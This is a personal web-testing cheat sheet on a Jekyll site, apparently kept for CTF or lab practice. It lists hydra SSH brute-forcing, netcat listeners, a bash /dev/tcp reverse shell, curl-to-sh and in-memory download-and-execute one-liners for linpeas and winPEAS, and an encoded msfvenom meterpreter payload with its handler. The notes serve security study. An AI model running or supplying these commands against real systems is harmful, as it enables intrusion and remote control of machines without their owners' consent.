---
layout: single
classes: #wide
title: "General Info"
sidebar:
    title: "General Info"
    nav: infosec
collection: infopages
permalink: /infosec/general/
toc: true
toc_sticky: true
author_profile: true
---

# Welcome
Hi, this page is because I can't for the life of me remember my options when I am trying to web-test.  

## General tips
flask -> usually jinja2  
```2> /dev/null``` - hides error output  

## Tmux
`tmux a` - attaches session
`tmux -S <name>` - attaches file session or creates one of that name

## Brute-Force
ffuf  
cme - SMB brute force tool  
hydra:  
ex: ```hydra -l usr -P pass.txt ssh://www.example.com```

## Listeners
wireshark - self explanitory  
nc - net cat is a good listner
* Example usage: nc -lvnp 

## Wordlists
/usr/share/wordlists/  
* /seclists

## Network 
```python http.server``` - v3 python  
* Spawns python server

netexec:  
* Network service exploitation tool
* Helps automate assessing large networks

## Shells
reverse shell tips:  
```rlwrap nc -lnvpn``` (reverse shell with better fuctionality/arrowkeys)  

after get shell:  
```python3 -c 'import pty;pty.spawn("/bin/bash")'```
```ctrl - z```(to background the nc process)  
```stty raw -echo;fg```
```export TERM=xterm```   
* makes able to clear term
* better machine access

bash -i >& /dev/tcp/<your_ip>/<your_port> 0>&1

## Linpeas & Winpeas
[Linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS):  
`curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh `  
`python -c "import urllib.request; urllib.request.urlretrieve('https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')" `  

[Winpeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS):  
url =   
`$url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe" `  
One liner to download and execute winPEASany from memory in a PS shell  
`$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("") `

## Other
Pspy - inspect application  
`powershell -c` - allows for powershell command    
Exiftool - analyzing metadata


## Refrance links 
tbd

## Post exploit
Exiftool - analyzing meta data
look for weird configs  
linpeas.sh big

## Msfconsole
`sessions -i <session num>` - attach session   
`sessions -u <session num>` - upgrade to meterpreter

### Shells 
ex msfvenom reverse shell:  
`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe`
ex msfconsole listener:  
`use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-thm-ip set LPORT listening-port run`

### Meterpreter
`channel -i <session>` - attaches
`upload <file>` - uploads file

